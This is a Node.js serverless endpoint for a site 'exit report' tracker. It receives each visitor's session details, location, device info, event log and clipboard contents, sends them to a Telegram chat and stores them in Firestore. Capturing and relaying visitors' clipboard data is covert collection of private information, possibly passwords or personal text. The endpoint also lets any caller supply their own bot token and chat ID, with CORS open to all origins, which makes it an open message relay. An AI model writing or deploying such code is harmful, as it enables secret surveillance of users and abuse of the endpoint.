const admin = require('firebase-admin');
const axios = require('axios');
const { escapeHtml, panel, row } = require('./telegramFormat');

// Initialize Firebase — credentials come from Vercel environment variables only.
if (!process.env.FIREBASE_PRIVATE_KEY) {
    throw new Error('FIREBASE_PRIVATE_KEY env var is missing');
}

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert({
            "project_id": "omeryigitler-5abfb",
            "private_key": process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
            "client_email": "firebase-adminsdk-fbsvc@omeryigitler-5abfb.iam.gserviceaccount.com"
        })
    });
}

const db = admin.firestore();
const BOT_TOKEN_EXIT = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN_EXIT || !CHAT_ID) {
    throw new Error('TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID env vars are missing');
}

module.exports = async (req, res) => {
    // 1. Unified CORS Control
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle Preflight
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(200).send('OK');

    // --- FINAL FORTRESS PARSING (V42) ---
    let data = {};
    const rawBody = req.body;

    try {
        if (typeof rawBody === 'object' && !Buffer.isBuffer(rawBody)) {
            data = rawBody;
        } else {
            const bodyStr = Buffer.isBuffer(rawBody) ? rawBody.toString() : String(rawBody);
            if (bodyStr.trim().startsWith('{')) {
                data = JSON.parse(bodyStr);
            } else if (bodyStr.includes('=')) {
                bodyStr.split('&').forEach(pair => {
                    const [k, v] = pair.split('=');
                    data[decodeURIComponent(k)] = decodeURIComponent(v || '');
                });
            }
        }
    } catch (e) {
        console.error("V42 Parse Error:", e.message);
    }

    const {
        sessionID,
        duration,
        exitPage,
        location,
        deviceInfo,
        clipboard,
        eventLog,
        botToken,
        chatId
    } = data;

    if (!sessionID) {
        console.error("400: Missing Session ID");
        return res.status(400).send('Missing Session ID');
    }

    const finalBotToken = botToken || BOT_TOKEN_EXIT;
    const finalChatId = chatId || CHAT_ID;

    try {
        const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;

        const compactClipboard = escapeHtml(clipboard || 'None').substring(0, 900);
        const compactEventLog = escapeHtml(eventLog || 'No events recorded').substring(0, 1400);

        // Single Telegram message: one exit event must produce one notification.
        const telegramMsg = brandingLink + panel({
            title: 'TAURUS // EXIT REPORT',
            subtitle: 'Visitor session closed',
            rows: [
                row('🆔', 'Session', sessionID, { code: true }),
                row('⏱️', 'Duration', `${duration}s`, { code: true }),
                row('📍', 'Exit Page', exitPage, { code: true }),
                row('🌍', 'Location', location || 'Unknown'),
                row('💻', 'Device', deviceInfo || 'Unknown'),
                `📋 <b>Clipboard</b>\n<pre>${compactClipboard}</pre>`,
                `📝 <b>Event Log</b>\n<pre>${compactEventLog}</pre>`,
            ],
        });

        let telegramSent = false;
        try {
            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                chat_id: finalChatId,
                text: telegramMsg.substring(0, 4090),
                parse_mode: 'HTML',
                disable_web_page_preview: false
            });

            telegramSent = true;
        } catch (tgErr) {
            console.error("Telegram delivery failed:", tgErr.response?.data || tgErr.message);
        }

        // 3. Save to Firestore (Backend logging only, outside the customer inbox)
        await db.collection('system_reports').add({
            name: "System Report",
            email: "tracker@taurus.sys",
            message: telegramMsg.replace(/<[^>]*>/g, '').substring(0, 5000),
            timestamp: admin.firestore.FieldValue.serverTimestamp(),
            status: 'logged',
            type: 'report',
            priority: 'high',
            sessionID: sessionID,
            telegram_notified: telegramSent
        });

        return res.status(200).json({ success: true, telegramSent });
    } catch (error) {
        console.error("Report API Error:", error);
        return res.status(500).json({ error: error.message });
    }
};
